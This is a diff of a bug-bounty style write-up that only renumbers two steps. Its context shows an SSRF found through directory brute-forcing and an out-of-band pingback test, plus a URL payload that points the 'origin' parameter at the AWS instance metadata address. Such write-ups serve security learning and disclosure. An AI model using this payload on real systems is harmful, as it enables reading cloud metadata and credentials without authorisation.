@@ -9,8 +9,8 @@ python3 dirsearch.py -l target.txt --deep-recursive
 ```
 targetconnect-dev.target.com/proxy.stream?origin=https://google.com
 ```
-4. I tried using an Out Of Band Interaction Tester (OOB) like BurpSuite Collaborator and it worked. I received a pingback.
-5. I now searched the parameter on Google and found a tweet where someone tried to use the AWS Metadata URL, so I tried using it and it worked.<br>
+3. I tried using an Out Of Band Interaction Tester (OOB) like BurpSuite Collaborator and it worked. I received a pingback.
+4. I now searched the parameter on Google and found a tweet where someone tried to use the AWS Metadata URL, so I tried using it and it worked.<br>
 ```
 /proxy.stream?origin=http://169.254.169.254/latest/metadata/
 ```
